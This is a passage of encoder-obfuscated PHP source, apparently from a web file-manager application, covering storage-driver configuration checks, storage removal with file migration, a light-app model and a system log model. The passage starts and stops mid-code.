($Ìä¥í…ï != $ùåô¼¬â) { $ÔîÅ¸¥[$œ»ÒË•[2310]] = $œ»ÒË•[91]; } } } public function checkConfig(&$“–¢­İİ, $ŸäßÂ™ = false) { $»÷‚ÛÁ¹ =& $_SERVER[´È¥ö†ö]; $ÂÇÎÅŠ‹ = strtolower($“–¢­İİ[$»÷‚ÛÁ¹[98]]); $¶™¬Ÿú˜ = $“–¢­İİ[$»÷‚ÛÁ¹[6]]; if (!is_array($¶™¬Ÿú˜)) { $¶™¬Ÿú˜ = json_decode($¶™¬Ÿú˜, !0); } foreach ($¶™¬Ÿú˜ as $“œ×¤áñ => $›ê”šŒÊ) { if (is_string($›ê”šŒÊ)) { $¶™¬Ÿú˜[$“œ×¤áñ] = trim($›ê”šŒÊ); } } $¶™¬Ÿú˜[$»÷‚ÛÁ¹[2313]] = rand_string(6); $Ãî¥ºï‘ = $GLOBALS[$»÷‚ÛÁ¹[6]][$»÷‚ÛÁ¹[92]][$»÷‚ÛÁ¹[902]]; $×áÑ å = isset($Ãî¥ºï‘[$ÂÇÎÅŠ‹]) ? $Ãî¥ºï‘[$ÂÇÎÅŠ‹] : ucfirst($ÂÇÎÅŠ‹); $•‘âô° = $»÷‚ÛÁ¹[77] . $×áÑ å; if (!$×áÑ å || !class_exists($•‘âô°)) { if ($ŸäßÂ™) { return LNG($»÷‚ÛÁ¹[2314]); } write_log(array($»÷‚ÛÁ¹[2315], $“–¢­İİ, get_caller_info()), $»÷‚ÛÁ¹[215]); show_json(LNG($»÷‚ÛÁ¹[2314]), !1, $“–¢­İİ); } $Äò‹ç³ƒ = new $•‘âô°($¶™¬Ÿú˜); if (in_array($ÂÇÎÅŠ‹, $Äò‹ç³ƒ->objectDriver)) { try { if (!$Äò‹ç³ƒ->isBucketCors() && !$Äò‹ç³ƒ->setBucketCors()) { $¢“ˆÖØ = LNG($»÷‚ÛÁ¹[2316]); $¢“ˆÖØ .= $»÷‚ÛÁ¹[2317] . LNG($»÷‚ÛÁ¹[2318]); } } catch (Exception $Ğ™ÈŸÌ) { $¢“ˆÖØ = $Ğ™ÈŸÌ->getMessage(); } if (isset($¢“ˆÖØ)) { return $this->_parseError($¢“ˆÖØ, $ÂÇÎÅŠ‹, $ŸäßÂ™); } if ($ÂÇÎÅŠ‹ == $»÷‚ÛÁ¹[68] && !$Äò‹ç³ƒ->checkRegion()) { return $this->_parseError(LNG($»÷‚ÛÁ¹[2319]), $ÂÇÎÅŠ‹, $ŸäßÂ™); } } $¤‹¶êò = rtrim($¶™¬Ÿú˜[$»÷‚ÛÁ¹[1261]], $»÷‚ÛÁ¹[8]) . $»÷‚ÛÁ¹[8]; $øñ²…¸Ö = $Äò‹ç³ƒ->getPath($¤‹¶êò . $»÷‚ÛÁ¹[1265]); try { if ($ÂÇÎÅŠ‹ == $»÷‚ÛÁ¹[109]) { $Äò‹ç³ƒ->mkdir($¤‹¶êò); } $ÇÙ¼ ¡Ş = $Äò‹ç³ƒ->mkfile($øñ²…¸Ö); if (!$ÇÙ¼ ¡Ş) { $¢“ˆÖØ = LNG($»÷‚ÛÁ¹[2316]); } } catch (Exception $Ğ™ÈŸÌ) { $¢“ˆÖØ = $Ğ™ÈŸÌ->getMessage(); } if (isset($¢“ˆÖØ)) { return $this->_parseError($¢“ˆÖØ, $ÂÇÎÅŠ‹, $ŸäßÂ™); } $¶™¬Ÿú˜[$»÷‚ÛÁ¹[1261]] = $¤‹¶êò; $“–¢­İİ[$»÷‚ÛÁ¹[6]] = json_encode($¶™¬Ÿú˜); $“–¢­İİ[$»÷‚ÛÁ¹[98]] = $×áÑ å; return !0; } private function _parseError($İôÜ—Ø—, $â®–Ù®è, $âÅâò®ù = false) { $³ˆÕ¦É¢ =& $_SERVER[´È¥ö†ö]; if ($â®–Ù®è == $³ˆÕ¦É¢[68] && stripos($İôÜ—Ø—, $³ˆÕ¦É¢[2320])) { $Ã¤«’‹Ğ = explode($³ˆÕ¦É¢[10], $İôÜ—Ø—); $®‘²’Ÿ˜ = isset($Ã¤«’‹Ğ[1]) ? $Ã¤«’‹Ğ[1] : $³ˆÕ¦É¢[12]; $ğûşçÈ® = array($³ˆÕ¦É¢[2321] => LNG($³ˆÕ¦É¢[2322]), $³ˆÕ¦É¢[2323] => LNG($³ˆÕ¦É¢[2324])); if (isset($ğûşçÈ®[$®‘²’Ÿ˜])) { $İôÜ—Ø— = $ğûşçÈ®[$®‘²’Ÿ˜]; } } if (stripos($İôÜ—Ø—, $³ˆÕ¦É¢[2325]) === 0) { $Ú§ÔÂÒÁ = strpos($İôÜ—Ø—, $³ˆÕ¦É¢[178]); if ($Ú§ÔÂÒÁ === !1) { $Ú§ÔÂÒÁ = strpos($İôÜ—Ø—, $³ˆÕ¦É¢[4]); } if ($Ú§ÔÂÒÁ !== !1) { $İôÜ—Ø— = substr($İôÜ—Ø—, $Ú§ÔÂÒÁ + 1); } } $İôÜ—Ø— = LNG($³ˆÕ¦É¢[1268]) . $İôÜ—Ø—; if ($âÅâò®ù) { return $İôÜ—Ø—; } show_json($İôÜ—Ø—, !1); } public function driverListSystem() { $¼¹”ÖÓ =& $_SERVER[´È¥ö†ö]; $ÔÈ÷¤Û = parent::listData(); $Ô£ÃÏ± = array(); foreach ($ÔÈ÷¤Û as $ùñéûôæ) { unset($ùñéûôæ[$¼¹”ÖÓ[233]], $ùñéûôæ[$¼¹”ÖÓ[88]]); if (!is_array($ùñéûôæ[$¼¹”ÖÓ[6]])) { $ùñéûôæ[$¼¹”ÖÓ[6]] = json_decode($ùñéûôæ[$¼¹”ÖÓ[6]], !0); } $Ô£ÃÏ±[] = $ùñéûôæ; } return $Ô£ÃÏ±; } public function defaultDriver() { $¬˜Š•Åí =& $_SERVER[´È¥ö†ö]; $ªâ«‘Š = parent::listData(); $û´Ë”Ã = array_filter_by_field($ªâ«‘Š, $¬˜Š•Åí[37], 1); $û´Ë”Ã = $û´Ë”Ã[0]; if (!$û´Ë”Ã) { return array(); } if (!is_array($û´Ë”Ã[$¬˜Š•Åí[6]])) { $û´Ë”Ã[$¬˜Š•Åí[6]] = json_decode($û´Ë”Ã[$¬˜Š•Åí[6]], !0); } return $û´Ë”Ã; } public function driverInfo($ÚÁğÅ£‘) { $ÂÉàİ¬ =& $_SERVER[´È¥ö†ö]; $²±¸Ù™ = array_to_keyvalue(parent::listData(), $ÂÉàİ¬[486]); if (!isset($²±¸Ù™[$ÚÁğÅ£‘])) { return !1; } $‚î™ĞµÈ = $²±¸Ù™[$ÚÁğÅ£‘]; if (!is_array($‚î™ĞµÈ[$ÂÉàİ¬[6]])) { $‚î™ĞµÈ[$ÂÉàİ¬[6]] = json_decode($‚î™ĞµÈ[$ÂÉàİ¬[6]], !0); } return $‚î™ĞµÈ; } public function remove($£ºÍ—Ù ) { $this->removeShareItems($£ºÍ—Ù ); return parent::remove($£ºÍ—Ù ); } public function removeWithFile($ÓÇÉş¦µ, $„ÓÖ†”, $úªã¸´Ù, $ïğæà™û = false) { $™×¬® =& $_SERVER[´È¥ö†ö]; $Ï¦œÃ½œ = array($™×¬®[894] => $ÓÇÉş¦µ); $‹Ì‹‰Ó = Model($™×¬®[555])->where($Ï¦œÃ½œ)->count(); $òÃë×’ = Model($™×¬®[555])->where($Ï¦œÃ½œ)->sum($™×¬®[79]); $İŞ—ùÛù = $„ÓÖ†” . $™×¬®[2326] . $ÓÇÉş¦µ; $¿ÑúÄ¶Û = LNG($„ÓÖ†” == $™×¬®[634] ? $™×¬®[2327] : $™×¬®[2328]); $óÊíæ±ç = new TaskFileTransfer($İŞ—ùÛù, $™×¬®[215], $‹Ì‹‰Ó, $¿ÑúÄ¶Û . $™×¬®[473] . $úªã¸´Ù[$™×¬®[32]] . $™×¬®[214] . $ÓÇÉş¦µ); $óÊíæ±ç->task[$™×¬®[839]] = (double) $òÃë×’; $šÚÖœš½ = KodIO::defaultDriver(); $¦äŞ€¢ñ = $šÚÖœš½[$™×¬®[486]]; $¤Á“æÎ = $ÈËãŠÁ€ = $³ˆ‡ëÊÒ = array(); $öÅ™Ô†Ÿ = Model($™×¬®[232])->where($Ï¦œÃ½œ)->field($™×¬®[2329])->select(); foreach ($öÅ™Ô†Ÿ as $–ƒ°æÇ‰) { $‘ÀÃÔ½ = $–ƒ°æÇ‰[$™×¬®[552]]; if ($ïğæà™û) { $ÈËãŠÁ€[] = $‘ÀÃÔ½; continue; } $ß¢Ù½šÌ = $–ƒ°æÇ‰[$™×¬®[87]]; $áõ¶·ô = get_path_father($ß¢Ù½šÌ); $³ˆ‡ëÊÒ[] = $áõ¶·ô; $áõ¶·ô = str_replace("\x7b\x69\157\72{$ÓÇÉş¦µ}\175\x2f", "\173\x69\x6f\72{$¦äŞ€¢ñ}\175\x2f", $áõ¶·ô); if (!IO::exist($ß¢Ù½šÌ)) { $¤Á“æÎ[] = $‘ÀÃÔ½; $óÊíæ±ç->updateFileEnd($–ƒ°æÇ‰[$™×¬®[32]], $–ƒ°æÇ‰[$™×¬®[79]]); write_log($™×¬®[2330] . $ß¢Ù½šÌ, $™×¬®[1905]); continue; } $áìÎŸÎ = IO::move($ß¢Ù½šÌ, $áõ¶·ô, REPEAT_RENAME); if (!$áìÎŸÎ) { $ÈËãŠÁ€[] = $‘ÀÃÔ½; $óÊíæ±ç->updateFileEnd($–ƒ°æÇ‰[$™×¬®[32]], $–ƒ°æÇ‰[$™×¬®[79]]); write_log($™×¬®[2331] . $ß¢Ù½šÌ, $™×¬®[1905]); continue; } $Ï¦œÃ½œ = array($™×¬®[552] => $‘ÀÃÔ½); $ÚÂóÙ‹ø = array($™×¬®[894] => $¦äŞ€¢ñ, $™×¬®[87] => $áìÎŸÎ); Model($™×¬®[232])->where($Ï¦œÃ½œ)->save($ÚÂóÙ‹ø); } $ßë¹ÛÄû = $óÊíæ±ç->task; if (!$ïğæà™û) { Cache::set($İŞ—ùÛù, $ßë¹ÛÄû); } $óÊíæ±ç->end(); $¤Á“æÎ = array_unique($¤Á“æÎ); $ÈËãŠÁ€ = array_unique($ÈËãŠÁ€); if (!$ïğæà™û && ($¤Á“æÎ || $ÈËãŠÁ€)) { $í ÏÖºë = array(); if ($¤Á“æÎ) { $í ÏÖºë[] = sprintf(LNG($™×¬®[2332]), count($¤Á“æÎ)); } if ($ÈËãŠÁ€) { $í ÏÖºë[] = sprintf(LNG($™×¬®[2333]), count($ÈËãŠÁ€)); } $í ÏÖºë = sprintf(LNG($™×¬®[2334]), implode($™×¬®[2335], $í ÏÖºë)) . $™×¬®[2336] . date($™×¬®[2337]) . $™×¬®[2338]; if ($„ÓÖ†” == $™×¬®[1942]) { $í ÏÖºë .= $™×¬®[2339] . LNG($™×¬®[2340]); } else { $í ÏÖºë = LNG($™×¬®[2341]) . $™×¬®[2342] . $í ÏÖºë; } $ßë¹ÛÄû[$™×¬®[1263]] = $í ÏÖºë; Cache::set($İŞ—ùÛù, $ßë¹ÛÄû); unset($úªã¸´Ù[$™×¬®[6]]); $·§Òêì‘ = array($™×¬®[486] => $ÓÇÉş¦µ, $™×¬®[2213] => $™×¬®[634], $™×¬®[32] => $úªã¸´Ù[$™×¬®[32]], $™×¬®[98] => $úªã¸´Ù[$™×¬®[98]]); Hook::trigger($™×¬®[1784], array($™×¬®[1286] => $·§Òêì‘, $™×¬®[1296] => !0)); show_json($í ÏÖºë, !1, 100111); } if ($„ÓÖ†” == $™×¬®[634]) { return !0; } if ($¤Á“æÎ || $ÈËãŠÁ€) { $„ñøë„– = array_merge($¤Á“æÎ, $ÈËãŠÁ€); $„ñøë„– = array_filter(array_unique($„ñøë„–)); $this->removeByFileID($„ñøë„–); } if ($³ˆ‡ëÊÒ) { $³ˆ‡ëÊÒ = array_filter(array_unique($³ˆ‡ëÊÒ)); foreach ($³ˆ‡ëÊÒ as $ß¢Ù½šÌ) { $ÆÆ‘ùü = IO::has($ß¢Ù½šÌ, !0); if (!$ÆÆ‘ùü[$™×¬®[241]] && !$ÆÆ‘ùü[$™×¬®[242]]) { IO::remove($ß¢Ù½šÌ); } } } return $this->remove($ÓÇÉş¦µ); } private function removeByFileID($µ®¯©–‚ = array()) { $ŸÜºí™Ñ =& $_SERVER[´È¥ö†ö]; if (empty($µ®¯©–‚)) { return; } $¦İã¹¥ = array($ŸÜºí™Ñ[552] => array($ŸÜºí™Ñ[7], $µ®¯©–‚)); $µš’ÜÔ„ = Model($ŸÜºí™Ñ[1420])->where($¦İã¹¥)->field($ŸÜºí™Ñ[193])->select(); if (!$µš’ÜÔ„) { return Model($ŸÜºí™Ñ[555])->remove($µ®¯©–‚); } $µš’ÜÔ„ = array_to_keyvalue($µš’ÜÔ„, $ŸÜºí™Ñ[12], $ŸÜºí™Ñ[193]); foreach ($µš’ÜÔ„ as $óæëÒ‡«) { Model($ŸÜºí™Ñ[901])->removeNow($óæëÒ‡«, !1); } } private function removeShareItems($¶œÉÂ•à) { $·òÑ¹½‹ =& $_SERVER[´È¥ö†ö]; $ç³ıÛ±Œ = "\x7b\151\x6f\x3a{$¶œÉÂ•à}\175\x2f"; $¤Ãú¦ºô = array($·òÑ¹½‹[193] => 0, $·òÑ¹½‹[1256] => array($·òÑ¹½‹[470], "{$ç³ıÛ±Œ}\x25")); $×êÔÈäú = Model($·òÑ¹½‹[1953])->where($¤Ãú¦ºô)->field($·òÑ¹½‹[679])->select(); if (empty($×êÔÈäú)) { return; } $¬¥Ó«¥€ = array_to_keyvalue($×êÔÈäú, $·òÑ¹½‹[12], $·òÑ¹½‹[679]); Model($·òÑ¹½‹[678])->remove($¬¥Ó«¥€); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\114\x69\x67\x68\x74\x41\160\x70"; public $modelType = "\x53\171\163\x74\145\155\117\x70\164\x69\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\147\162\x6f\x75\160", "\x64\145\x73\143", "\x63\157\156\164\x65\156\x74"); public function listData($ÎÒíè©÷ = false, $™½»’çÎ = "\155\x6f\144\151\146\x79\x54\151\155\x65", $…¤ˆƒ = true) { return parent::listData($ÎÒíè©÷, $™½»’çÎ, $…¤ˆƒ); } public function remove($Î¢ä¥Ù) { $ñ‡µÃßÈ = $this->findByName($Î¢ä¥Ù); if (!$ñ‡µÃßÈ) { return !1; } return parent::remove($ñ‡µÃßÈ[$_SERVER[´È¥ö†ö][486]]); } public function add($ûøÒöÅ) { if ($this->findByName($ûøÒöÅ[$_SERVER[´È¥ö†ö][32]])) { return !1; } return parent::insert($ûøÒöÅ); } public function update($ÑŠö©Úí, $ŸœÁ¯õ¶) { $âë„æÂ” =& $_SERVER[´È¥ö†ö]; $²í‡Á¶· = $this->findByName($ÑŠö©Úí); $º¡ãÌÌ² = $this->findByName($ŸœÁ¯õ¶[$âë„æÂ”[32]]); if (!$²í‡Á¶· || $º¡ãÌÌ² && $º¡ãÌÌ²[$âë„æÂ”[486]] != $²í‡Á¶·[$âë„æÂ”[486]]) { return !1; } return parent::update($²í‡Á¶·[$âë„æÂ”[486]], $ŸœÁ¯õ¶); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\x69\x6d\145", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\x74", "\146\x75\156\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $äµ™ŞŒÏ =& $_SERVER[´È¥ö†ö]; return array($äµ™ŞŒÏ[2343] => LNG($äµ™ŞŒÏ[2344]), $äµ™ŞŒÏ[2345] => LNG($äµ™ŞŒÏ[2346]), $äµ™ŞŒÏ[1916] => LNG($äµ™ŞŒÏ[2347]), $äµ™ŞŒÏ[2348] => LNG($äµ™ŞŒÏ[2349]), $äµ™ŞŒÏ[2350] => LNG($äµ™ŞŒÏ[2351]), $äµ™ŞŒÏ[2352] => LNG($äµ™ŞŒÏ[2353]), $äµ™ŞŒÏ[2354] => LNG($äµ™ŞŒÏ[2355]), $äµ™ŞŒÏ[1946] => LNG($äµ™ŞŒÏ[2355]), $äµ™ŞŒÏ[1947] => LNG($äµ™ŞŒÏ[2356]), $äµ™ŞŒÏ[2357] => LNG($äµ™ŞŒÏ[2358]), $äµ™ŞŒÏ[2359] => LNG($äµ™ŞŒÏ[2360]), $äµ™ŞŒÏ[2361] => LNG($äµ™ŞŒÏ[2362]), $äµ™ŞŒÏ[2363] => LNG($äµ™ŞŒÏ[2364]), $äµ™ŞŒÏ[1944] => LNG($äµ™ŞŒÏ[2365]), $äµ™ŞŒÏ[2366] => LNG($äµ™ŞŒÏ[2367]), $äµ™ŞŒÏ[1951] => LNG($äµ™ŞŒÏ[2368]), $äµ™ŞŒÏ[2369] => LNG($äµ™ŞŒÏ[2370]), $äµ™ŞŒÏ[2371] => LNG($äµ™ŞŒÏ[2372]), $äµ™ŞŒÏ[2373] => LNG($äµ™ŞŒÏ[2374]), $äµ™ŞŒÏ[2375] => LNG($äµ™ŞŒÏ[2376]), $äµ™ŞŒÏ[1954] => LNG($äµ™ŞŒÏ[2377]), $äµ™ŞŒÏ[1955] => LNG($äµ™ŞŒÏ[2378]), $äµ™ŞŒÏ[2379] => LNG($äµ™ŞŒÏ[2380]), $äµ™ŞŒÏ[2381] => LNG($äµ™ŞŒÏ[2382]), $äµ™ŞŒÏ[2383] => LNG($äµ™ŞŒÏ[2384]), $äµ™ŞŒÏ[1949] => LNG($äµ™ŞŒÏ[2385]), $äµ™ŞŒÏ[2386] => LNG($äµ™ŞŒÏ[2387]), $äµ™ŞŒÏ[1948] => LNG($äµ™ŞŒÏ[2388]), $äµ™ŞŒÏ[2389] => LNG($äµ™ŞŒÏ[2390]), $äµ™ŞŒÏ[2391] => LNG($äµ™ŞŒÏ[2392]), $äµ™ŞŒÏ[2393] => LNG($äµ™ŞŒÏ[2392]), $äµ™ŞŒÏ[2394] => LNG($äµ™ŞŒÏ[2395]), $äµ™ŞŒÏ[2396] => LNG($äµ™ŞŒÏ[2396]), $äµ™ŞŒÏ[2397] => LNG($äµ™ŞŒÏ[1920]), $äµ™ŞŒÏ[2398] => LNG($äµ™ŞŒÏ[2399]), $äµ™ŞŒÏ[2400] => LNG($äµ™ŞŒÏ[2401]), $äµ™ŞŒÏ[2402] => LNG($äµ™ŞŒÏ[2403]), $äµ™ŞŒÏ[2404] => LNG($äµ™ŞŒÏ[2405]), $äµ™ŞŒÏ[2406] => LNG($äµ™ŞŒÏ[2407]), $äµ™ŞŒÏ[2408] => LNG($äµ™ŞŒÏ[2408]), $äµ™ŞŒÏ[2409] => LNG($äµ™ŞŒÏ[2410]), $äµ™ŞŒÏ[2411] => LNG($äµ™ŞŒÏ[2412]), $äµ™ŞŒÏ[2413] => LNG($äµ™ŞŒÏ[2414]), $äµ™ŞŒÏ[2415] => LNG($äµ™ŞŒÏ[2416]), $äµ™ŞŒÏ[2417] => LNG($äµ™ŞŒÏ[2418]), $äµ™ŞŒÏ[2419] => LNG($äµ™ŞŒÏ[2420]), $äµ™ŞŒÏ[212] => LNG($äµ™ŞŒÏ[212]), $äµ™ŞŒÏ[213] => LNG($äµ™ŞŒÏ[2421]), $äµ™ŞŒÏ[2422] => LNG($äµ™ŞŒÏ[2422])); } private function typeFile() { $Ü“¤—Ì =& $_SERVER[´È¥ö†ö]; $©îØ£î = array($Ü“¤—Ì[1951] => array($Ü“¤—Ì[1952]), $Ü“¤—Ì[2361] => array($Ü“¤—Ì[2423]), $Ü“¤—Ì[2363] => array($Ü“¤—Ì[2424]), $Ü“¤—Ì[1944] => array($Ü“¤—Ì[1945], $Ü“¤—Ì[2425]), $Ü“¤—Ì[2371] => array(), $Ü“¤—Ì[2373] => array(), $Ü“¤—Ì[2375] => array(), $Ü“¤—Ì[1954] => array($Ü“¤—Ì[1956]), $Ü“¤—Ì[1955] => array($Ü“¤—Ì[1956]), $Ü“¤—Ì[2379] => array($Ü“¤—Ì[2426]), $Ü“¤—Ì[2381] => array($Ü“¤—Ì[2426]), $Ü“¤—Ì[2383] => array($Ü“¤—Ì[2427]), $Ü“¤—Ì[2369] => array($Ü“¤—Ì[2428]), $Ü“¤—Ì[1949] => array($Ü“¤—Ì[2429]), $Ü“¤—Ì[2386] => array($Ü“¤—Ì[2430]), $Ü“¤—Ì[1948] => array($Ü“¤—Ì[1950])); return $©îØ£î; } private function typeAll() { $˜ÀÂ‹î¹ =& $_SERVER[´È¥ö†ö]; $‡ÆŠ¶ø = $this->typeList; $Í‚ş¢‹î = array_filter($this->typeFile()); foreach ($Í‚ş¢‹î as $—¢¬ûÕª => $šÖæèøä) { $‡ÆŠ¶ø[$šÖæèøä[0]] = $‡ÆŠ¶ø[$—¢¬ûÕª]; } $‡ÆŠ¶ø[$˜ÀÂ‹î¹[1956]] = LNG($˜ÀÂ‹î¹[2431]); $‡ÆŠ¶ø[$˜ÀÂ‹î¹[2426]] = LNG($˜ÀÂ‹î¹[2432]); return $‡ÆŠ¶ø; } public function addLog($Ùñöëå, $òê¶ô = array()) { $ÀÌî±¿« =& $_SERVER[´È¥ö†ö]; if (!isset($this->typeList[$Ùñöëå])) { return; } $ÏİŒÏ¼É = Session::get($ÀÌî±¿«[2115]); if (!$ÏİŒÏ¼É) { $ÏİŒÏ¼É = _get($òê¶ô, $ÀÌî±¿«[1773], 0); } if ($Ùñöëå == $ÀÌî±¿«[2398] && is_array($òê¶ô[$ÀÌî±¿«[2433]]) && !$òê¶ô[$ÀÌî±¿«[2433]]) { return; } $ì˜Š–± = get_client_ip(); if (!$òê¶ô || strlen(json_encode($òê¶ô)) >= 1024 * 64) { if ($òê¶ô && is_array($òê¶ô)) { $òê¶ô = array_intersect_key($òê¶ô, array_flip($ÀÌî±¿«[486], $ÀÌî±¿«[32])); $òê¶ô[$ÀÌî±¿«[2434]] = $ì˜Š–±; } else { $òê¶ô = array($ÀÌî±¿«[2434] => $ì˜Š–±); } } else { if (is_array($òê¶ô)) { $òê¶ô[$ÀÌî±¿«[2434]] = $ì˜Š–±; } else { $òê¶ô = array($ÀÌî±¿«[1286] => $òê¶ô, $ÀÌî±¿«[2434] => $ì˜Š–±); } } $òê¶ô = array($ÀÌî±¿«[1763] => Session::sign(), $ÀÌî±¿«[1764] => intval($ÏİŒÏ¼É), $ÀÌî±¿«[33] => $Ùñöëå, $ÀÌî±¿«[1766] => json_encode($òê¶ô)); return parent::add($òê¶ô); } public function remove($–Ú­¿Š£) { $this->where(array($_SERVER[´È¥ö†ö][504] => $–Ú­¿Š£))->delete(); } private function _makeOrder($Ú£šÈÁã = '') { $–› Åíù =& $_SERVER[´È¥ö†ö]; $ïËÉ Ğ¿ = $–› Åíù[233]; $ŒªĞÓÙÖ = array($–› Åíù[534] => $–› Åíù[535], $–› Åíù[536] => $–› Åíù[537]); $ŒËèÆèª = Input::get($–› Åíù[542], $–› Åíù[7], $–› Åíù[2152], array($–› Åíù[2069], $–› Åíù[536])); $ŒËèÆèª = $ŒªĞÓÙÖ[$ŒËèÆèª]; $Ú£šÈÁã = $Ú£šÈÁã . "{$ïËÉ Ğ¿}\40{$ŒËèÆèª}"; return $this->order($Ú£šÈÁã); } public function get($Á€ŞÍµì = '') { $¢œµúÎ¢ =& $_SERVER[´È¥ö†ö]; if (!$Á€ŞÍµì) { show_json(array()); } $ğ¼Ó÷…ü = array(); if ($Á€ŞÍµì[$¢œµúÎ¢[1773]]) { $ğ¼Ó÷…ü[$¢œµúÎ¢[1773]] = $Á€ŞÍµì[$¢œµúÎ¢[1773]]; } if (isset($Á€ŞÍµì[$¢œµúÎ¢[836]])) { $û½Î©Ïª = $Á€ŞÍµì[$¢œµúÎ¢[836]]; $•‚Ùä— = isset($Á€ŞÍµì[$¢œµúÎ¢[837]]) ? $Á€ŞÍµì[$¢œµúÎ¢[837]] : time(); $ğ¼Ó÷…ü[$¢œµúÎ¢[233]] = array($¢œµúÎ¢[419], array($û½Î©Ïª, $•‚Ùä—)); } if ($Á€ŞÍµì[$¢œµúÎ¢[33]]) { $È¬“øÜ = explode($¢œµúÎ¢[50], $Á€ŞÍµì[$¢œµúÎ¢[33]]); $ı®°ßØĞ = $this->typeFile(); $™Ğ°¶¸û = array(); foreach ($È¬“øÜ as $¾„Ó¦ì) { $™Ğ°¶¸û[] = $¾„Ó¦ì; if (isset($ı®°ßØĞ[$¾„Ó¦ì])) { $™Ğ°¶¸û = array_merge($™Ğ°¶¸û, $ı®°ßØĞ[$¾„Ó¦ì]); } } $™Ğ°¶¸û = array_unique($™Ğ°¶¸û); if ($™Ğ°¶¸û) { $ğ¼Ó÷…ü[$¢œµúÎ¢[33]] = array($¢œµúÎ¢[7], $™Ğ°¶¸û); } } else { $ğ¼Ó÷…ü[$¢œµúÎ¢[33]] = array($¢œµúÎ¢[2435], $¢œµúÎ¢[2436]); } if (!empty($Á€ŞÍµì[$¢œµúÎ¢[2434]])) { $ğ¼Ó÷…ü[$¢œµúÎ¢[537]] = array($¢œµúÎ¢[470], "\45{$Á€ŞÍµì[$¢œµúÎ¢[2434]]}\45"); } $ƒõìãƒ¿ = $this->_makeOrder()->where($ğ¼Ó÷…ü)->selectPage(); if (empty($ƒõìãƒ¿[$¢œµúÎ¢[456]])) { show_json(array(), !0, $ƒõìãƒ¿[$¢œµúÎ¢[453]]); } $ƒõìãƒ¿[$¢œµúÎ¢[456]] = $this->logList($ƒõìãƒ¿[$¢œµúÎ¢[456]]); return $ƒõìãƒ¿; } private function ipAddress(&$£µ¬Ì) { $€ÀÀñëó =& $_SERVER[´È¥ö†ö]; if (!empty($£µ¬Ì[$€ÀÀñëó[2434]])) { $¹ÌÂè–‹ = IpLocation::get($£µ¬Ì[$€ÀÀñëó[2434]]); } else { $¹ÌÂè–‹ = LNG($€ÀÀñëó[2437]); } $£µ¬Ì[$€ÀÀñëó[2438]] = $¹ÌÂè–‹; } private function descZipDownload($¼—ÀºÉĞ, &$”‚æÒ) { $ÊÓ©ã“õ =& $_SERVER[´È¥ö†ö]; if (!isset($¼—ÀºÉĞ[$ÊÓ©ã“õ[2439]])) { return; } $ÓÓî——‚ = json_decode($¼—ÀºÉĞ[$ÊÓ©ã“õ[2439]], !0); foreach ($ÓÓî——‚ as $”şÓò´) { try { $Ñ€»À‰­ = IO::infoFullSimple($”şÓò´[$ÊÓ©ã“õ[87]]); } catch (Exception $ï™Å‰ªÑ) { continue; } $¼—ÀºÉĞ[$ÊÓ©ã“õ[87]] = $”şÓò´[$ÊÓ©ã“õ[87]]; $”‚æÒ[] = $¼—ÀºÉĞ[$ÊÓ©ã“õ[193]] = $Ñ€»À‰­[$ÊÓ©ã“õ[193]]; $”‚æÒ[] = $¼—ÀºÉĞ[$ÊÓ©ã“õ[2208]] = $Ñ€»À‰­[$ÊÓ©ã“õ[192]]; break; } return $¼—ÀºÉĞ; } private function getSourceList(&$İÏëïŸå) { $¤ï±ë¤ =& $_SERVER[´È¥ö†ö]; $©¦˜ø×¿ = array(); foreach ($İÏëïŸå as $ß„Åã‹ => $Ã’ğŒ¦¼) { $÷§ŒÏıœ = json_decode($Ã’ğŒ¦¼[$¤ï±ë¤[537]], !0); if ($Ã’ğŒ¦¼[$¤ï±ë¤[33]] == $¤ï±ë¤[1947]) { $÷§ŒÏıœ = $this->descZipDownload($÷§ŒÏıœ, $©¦˜ø×¿); $İÏëïŸå[$ß„Åã‹][$¤ï±ë¤[537]] = json_encode($÷§ŒÏıœ); continue; } if (strpos($Ã’ğŒ¦¼[$¤ï±ë¤[33]], $¤ï±ë¤[2210]) !== 0) { if (!isset($÷§ŒÏıœ[$¤ï±ë¤[87]]) || strpos($Ã’ğŒ¦¼[$¤ï±ë¤[33]], $¤ï±ë¤[2440]) !== 0) { continue; } try { $òÏ˜¬£¸ = IO::infoFullSimple($÷§ŒÏıœ[$¤ï±ë¤[87]]); } catch (Exception $³òİÑş) { continue; } $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[193]] = $òÏ˜¬£¸[$¤ï±ë¤[193]]; $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[2208]] = $òÏ˜¬£¸[$¤ï±ë¤[192]]; $İÏëïŸå[$ß„Åã‹][$¤ï±ë¤[537]] = json_encode($÷§ŒÏıœ); continue; } $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[193]]; $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[2208]]; if ($÷§ŒÏıœ[$¤ï±ë¤[33]] == $¤ï±ë¤[634]) { $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[537]][$¤ï±ë¤[1240]]; $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[537]][$¤ï±ë¤[1241]]; } if ($÷§ŒÏıœ[$¤ï±ë¤[33]] == $¤ï±ë¤[2219]) { $©¦˜ø×¿[] = $÷§ŒÏıœ[$¤ï±ë¤[537]][$¤ï±ë¤[193]]; } } if (!$©¦˜ø×¿) { return array(); } return Model($¤ï±ë¤[901])->sourceListInfo($©¦˜ø×¿, !0); } private function logList($Á„­¡¿) { $¼Şõ¨¿ô =& $_SERVER[´È¥ö†ö]; $•ÅÇƒ¥‡ = array_to_keyvalue($Á„­¡¿, $¼Şõ¨¿ô[12], $¼Şõ¨¿ô[1773]); $•íç‡À = Model($¼Şõ¨¿ô[608])->userListInfo(array_unique($•ÅÇƒ¥‡)); $ïÙúÈãş = $this->getSourceList($Á„­¡¿); $ú÷ú÷Ü£ = $this->typeAll(); $úÆÑ–õË = array(); $÷ÛÏÉ³£ = array(); foreach ($Á„­¡¿ as $‘±¥ıä¨ => $ºÍÃ‰Ç) { 